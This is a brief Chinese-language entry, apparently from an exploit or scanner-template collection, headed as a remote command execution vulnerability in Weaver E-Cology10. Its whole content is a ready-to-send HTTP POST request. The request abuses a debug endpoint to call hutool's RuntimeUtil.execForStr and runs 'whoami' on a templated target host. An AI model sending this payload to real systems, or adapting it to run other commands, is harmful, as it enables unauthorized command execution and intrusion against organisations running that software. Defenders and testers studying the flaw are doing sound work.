## 泛微 E-Cology10远程命令执行漏洞
```
POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

[["whoami"]]
```

